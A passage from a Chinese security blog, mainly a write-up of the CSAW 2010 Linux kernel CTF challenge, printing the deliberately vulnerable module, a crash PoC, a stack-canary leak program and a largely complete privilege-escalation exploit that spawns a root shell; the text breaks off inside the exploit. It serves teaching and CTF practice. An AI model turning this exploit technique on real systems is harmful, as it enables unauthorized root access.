<p>这篇文章介绍了Java反序列化漏洞利用的过程，后面还会对实际利用和检测进行介绍。<br><strong>补充：</strong><br>本来还想继续深入了解一下Java的反序列化漏洞，比如Java中间件中的反序列化漏洞利用，但是看到CVE-2014-7911，发现Android中的反序列化和Java中的好像还不太一样，Android中的反序列化是反序列化了一个不可序列化的对象，在反序列化时发生了类型混淆，导致成员变量被当做成员函数调用。具体细节后面会写文章进行介绍。<br><strong>reference</strong><br>JAVA反序列化漏洞完整过程分析与调试<br>Lib之过？Java反序列化漏洞通用利用分析</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
    <link itemprop="mainEntityOfPage" href="http://example.com/2017/04/22/CSAW2010-Kernel-Exploit/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="Bruce Fan">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="BruceFan's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2017/04/22/CSAW2010-Kernel-Exploit/" class="post-title-link" itemprop="url">CSAW2010 Kernel Exploit</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建于：2017-04-22 22:01:19" itemprop="dateCreated datePublished" datetime="2017-04-22T22:01:19+08:00">2017-04-22</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="更新于：2020-11-12 10:26:14" itemprop="dateModified" datetime="2020-11-12T10:26:14+08:00">2020-11-12</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>这是一道2010年关于Linux Kernel Exploit的题目，目标是提权。<br>题目代码如下：  </p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * csaw.c</span></span><br><span class="line"><span class="comment"> * CSAW CTF Challenge Kernel Module</span></span><br><span class="line"><span class="comment"> * Jon Oberheide &lt;jon@oberheide.org&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * This module implements the /proc/csaw interface which can be read</span></span><br><span class="line"><span class="comment"> * and written like a normal file. For example:</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * $ cat /proc/csaw</span></span><br><span class="line"><span class="comment"> * Welcome to the CSAW CTF challenge. Best of luck!</span></span><br><span class="line"><span class="comment"> * $ echo &quot;Hello World&quot; &gt; /proc/csaw</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/proc_fs.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;asm/uaccess.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_LENGTH 64</span></span><br><span class="line"></span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br><span class="line">MODULE_AUTHOR(<span class="string">&quot;Jon Oberheide&quot;</span>);</span><br><span class="line">MODULE_DESCRIPTION(<span class="string">&quot;CSAW CTF Challenge Kernel Module&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">proc_dir_entry</span> *<span class="title">csaw_proc</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span></span><br><span class="line">csaw_write(struct file *file, <span class="keyword">const</span> <span class="keyword">char</span> __user *ubuf, <span class="keyword">unsigned</span> <span class="keyword">long</span> count, <span class="keyword">void</span> *data)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[MAX_LENGTH];</span><br><span class="line"></span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;csaw: called csaw_write\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * We should be safe to perform this copy from userspace since our</span></span><br><span class="line"><span class="comment">     * kernel is compiled with CC_STACKPROTECTOR, which includes a canary</span></span><br><span class="line"><span class="comment">     * on the kernel stack to protect against smashing the stack.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * While the user could easily DoS the kernel, I don&#x27;t think they</span></span><br><span class="line"><span class="comment">     * should be able to escalate privileges without discovering the</span></span><br><span class="line"><span class="comment">     * secret stack canary value.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">if</span> (copy_from_user(&amp;buf, ubuf, count)) &#123;</span><br><span class="line">        printk(KERN_INFO <span class="string">&quot;csaw: error copying data from userspace\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> -EFAULT;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span></span><br><span class="line">csaw_read(<span class="keyword">char</span> *page, <span class="keyword">char</span> **start, <span class="keyword">off_t</span> off, <span class="keyword">int</span> count, <span class="keyword">int</span> *eof, <span class="keyword">void</span> *data)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[MAX_LENGTH];</span><br><span class="line"></span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;csaw: called csaw_read\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    *eof = <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">    <span class="built_in">strcpy</span>(buf, <span class="string">&quot;Welcome to the CSAW CTF challenge. Best of luck!\n&quot;</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(page, buf + off, MAX_LENGTH);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> MAX_LENGTH;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> __init</span><br><span class="line">csaw_init(<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;csaw: loading module\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    csaw_proc = create_proc_entry(<span class="string">&quot;csaw&quot;</span>, <span class="number">0666</span>, <span class="literal">NULL</span>);</span><br><span class="line">    csaw_proc-&gt;read_proc = csaw_read;</span><br><span class="line">    csaw_proc-&gt;write_proc = csaw_write;</span><br><span class="line"></span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;csaw: created /proc/csaw entry\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> __exit</span><br><span class="line">csaw_exit(<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (csaw_proc) &#123;</span><br><span class="line">        remove_proc_entry(<span class="string">&quot;csaw&quot;</span>, csaw_proc);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;csaw: unloading module\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(csaw_init);</span><br><span class="line">module_exit(csaw_exit);</span><br></pre></td></tr></table></figure>
<p>其中<code>proc_dir_entry</code>结构体定义如下：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">proc_dir_entry</span> &#123;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">short</span> low_ino;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">short</span> namelen;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *name;</span><br><span class="line">    <span class="keyword">mode_t</span> mode;</span><br><span class="line">    <span class="keyword">nlink_t</span> nlink;</span><br><span class="line">    <span class="keyword">uid_t</span> uid;</span><br><span class="line">    <span class="keyword">gid_t</span> gid;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> size;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">inode_operations</span> * <span class="title">proc_iops</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> * <span class="title">proc_fops</span>;</span></span><br><span class="line">    <span class="keyword">get_info_t</span> *get_info;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">module</span> *<span class="title">owner</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">proc_dir_entry</span> *<span class="title">next</span>, *<span class="title">parent</span>, *<span class="title">subdir</span>;</span></span><br><span class="line">    <span class="keyword">void</span> *data;</span><br><span class="line">    <span class="keyword">read_proc_t</span> *read_proc;</span><br><span class="line">    <span class="keyword">write_proc_t</span> *write_proc;</span><br><span class="line">    <span class="keyword">atomic_t</span> count;      <span class="comment">//use count </span></span><br><span class="line">    <span class="keyword">int</span> deleted;        <span class="comment">//delete flag</span></span><br><span class="line">    <span class="keyword">kdev_t</span>    rdev;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>其中<code>csaw_read()</code>原型函数：  </p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> (*read_proc)(<span class="keyword">char</span> *page, <span class="keyword">char</span> **start, <span class="keyword">off_t</span> offset, <span class="keyword">int</span> count, <span class="keyword">int</span> *eof, <span class="keyword">void</span> *data)</span><br></pre></td></tr></table></figure>
<p>这个函数与read的系统调用函数功能类似。就在/proc中为驱动程序设计了一个特有了文件（假设名csaw）后，则用户使用<code>cat /proc/csaw</code>时，会调用到此函数。<br>在/proc中创建文件的函数是<code>create_proc_entry</code>，并且返回一个<code>proc_dir_entry</code>结构体指针，通过给结构体指针的<code>read_proc</code>变量赋值，完成此文件与一个<code>read_proc</code>函数的关联。<br>删除这种关系，并且删除这个文件的函数是<code>remove_proc_entry</code>。<br>函数的参数：</p>
<ul>
<li>*page是驱动层向用户层返回的数据</li>
<li>**start表示写page的起始地址</li>
<li>off与read用法一致，表示文件指针的偏移</li>
<li>count与read用法一致，表示要读多少字节</li>
<li>eof输出参数</li>
<li>data由驱动内部使用</li>
</ul>
<p>回到题目中，代码的漏洞就是<code>csaw_write</code>函数的<code>copy_from_user()</code>从用户空间做拷贝时，未作任何检查，导致栈溢出。但是从注释中可以知道出题人开启了kernel canary，直接溢出会导致kernel panic。这种情况下，一般采取的方法是leak或者crack。继续分析代码，看到read部分会把栈上的一个缓冲区拷贝到用户空间：  </p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">memcpy</span>(page, buf + off, MAX_LENGTH);</span><br></pre></td></tr></table></figure>
<p>而且还可以控制偏移（off），这里可以leak栈上的canary。那么思路大概就是：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">junk+Canary+ebp+payload_addr</span><br></pre></td></tr></table></figure>
<p><strong>PoC</strong>  </p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">&quot;/proc/csaw&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (!fd) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;error\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">char</span> poc[<span class="number">72</span>];</span><br><span class="line">    <span class="built_in">memset</span>(poc, <span class="number">0x41</span>, <span class="number">72</span>);</span><br><span class="line">    write(fd, poc, <span class="number">72</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>PoC会直接导致kernel panic。<br>下面写一个dump程序来leak栈上的canary：  </p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">&quot;/proc/csaw&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (!fd) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;error\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    lseek(fd, <span class="number">16</span>, SEEK_CUR); <span class="comment">// 设置csaw_read的off参数</span></span><br><span class="line">    <span class="keyword">char</span> buffer[<span class="number">64</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    read(fd, buffer, <span class="number">64</span>); <span class="comment">// 从csaw_read的buf偏移为16的位置开始读64个字节到buffer</span></span><br><span class="line">    <span class="keyword">int</span> i, j;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123; <span class="comment">// 打印从内核读出的数据</span></span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">16</span>; j++) <span class="built_in">printf</span>(<span class="string">&quot;%02x &quot;</span>, buffer[i*<span class="number">16</span>+j] &amp; <span class="number">0xff</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot; | &quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">16</span> ; j++) <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, buffer[i*<span class="number">16</span>+j] &amp; <span class="number">0xff</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">char</span> canary[<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="built_in">memcpy</span>(canary, buffer+<span class="number">32</span>, <span class="number">4</span>); <span class="comment">// canary的位置可以在IDA中分析或调试出来</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;CANARY:&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) <span class="built_in">printf</span>(<span class="string">&quot;%02x&quot;</span>, canary[i] &amp; <span class="number">0xff</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/images/csaw2010/dump.png"><br>调试方法和前面的文章中介绍的一样。感觉之前会gdb调试用户态程序，现在学调试内核程序也很好上手，只是peda用不了非常不爽。<br><strong>exploit</strong>  </p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">trap_frame</span> &#123;</span></span><br><span class="line">    <span class="keyword">void</span> *eip;</span><br><span class="line">    <span class="keyword">uint32_t</span> cs;</span><br><span class="line">    <span class="keyword">uint32_t</span> eflags;</span><br><span class="line">    <span class="keyword">void</span> *esp;</span><br><span class="line">    <span class="keyword">uint32_t</span> ss;</span><br><span class="line">&#125; __attribute__((packed));</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">launch_shell</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    execl(<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;sh&quot;</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">trap_frame</span> <span class="title">tf</span>;</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">prepare_tf</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">&quot;pushl %cs; popl tf+4;&quot;</span></span><br><span class="line">        <span class="string">&quot;pushfl; popl tf+8;&quot;</span></span><br><span class="line">        <span class="string">&quot;pushl %esp; popl tf+12;&quot;</span></span><br><span class="line">        <span class="string">&quot;pushl %ss; popl tf+16;&quot;</span>);</span><br><span class="line">    tf.eip = &amp;launch_shell;</span><br><span class="line">    tf.esp -= <span class="number">1024</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KERNCALL __attribute__((regparm(3)))</span></span><br><span class="line"><span class="keyword">void</span> *(*prepare_kernel_cred)(<span class="keyword">void</span> *) KERNCALL = (<span class="keyword">void</span> *) <span class="number">0xc1057590</span>;</span><br><span class="line"><span class="keyword">void</span> *(*commit_creds)(<span class="keyword">void</span> *) KERNCALL = (<span class="keyword">void</span> *) <span class="number">0xc10573f0</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">payload</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    commit_creds(prepare_kernel_cred(<span class="number">0</span>));</span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">&quot;mov $tf, %esp;&quot;</span></span><br><span class="line">        <span class="string">&quot;iret;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">&quot;/proc/csaw&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (!fd) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;error\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    lseek(fd, <span class="number">16</span>, SEEK_CUR);</span><br><span class="line">    <span class="keyword">char</span> buffer[<span class="number">64</span>];</span><br><span class="line">    read(fd, buffer, <span class="number">64</span>);</span><br><span class="line">    <span class="keyword">int</span> i, j;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">16</span>; j++) <span class="built_in">printf</span>(<span class="string">&quot;%02x &quot;</span>, buffer[i*<span class="number">16</span>+j] &amp; <span class="number">0xff</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot; | &quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">16</span>; j++) <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, buffer[i*<span class="number">16</span>+j] &amp; <span class="number">0xff</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">char</span> canary[<span class="number">4</span>];</span><br><span class="line">    <span class="built_in">memcpy</span>(canary, buffer+<span class="number">32</span>, <span class="number">4</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;CANARY:&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) <span class="built_in">printf</span>(<span class="string">&quot;%02x&quot;</span>, canary[i] &amp; <span class="number">0xff</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="keyword">char</span> <span class="built_in">exp</span>[<span class="number">84</span>];</span><br><span class="line">    <span class="built_in">memset</span>(<span class="built_in">exp</span>, <span class="number">0x41</span>, <span class="number">84</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(<span class="built_in">exp</span>+<span class="number">64</span>, canary, <span class="number">4</span>); <span class="comment">// 设置canary</span></span><br><span class="line">    *((<span class="keyword">void</span> **)(<span class="built_in">exp</span>+<span class="number">64</span>+<span class="number">4</span>+<span class="number">4</span>+<span class="number">4</span>+<span class="number">4</span>)) = &amp;payload; <span class="comment">// 返回地址的位置可以IDA分析也可以调试，和用户态一样</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*]payload:%s\n&quot;</span>, <span class="built_in">exp</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Triger bug:\n&quot;</span>);</span><br><span class="line">    prepare_tf();</span><br><span class="line">    write(fd, <span class="built_in">exp</span>, <span class="number">84</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span 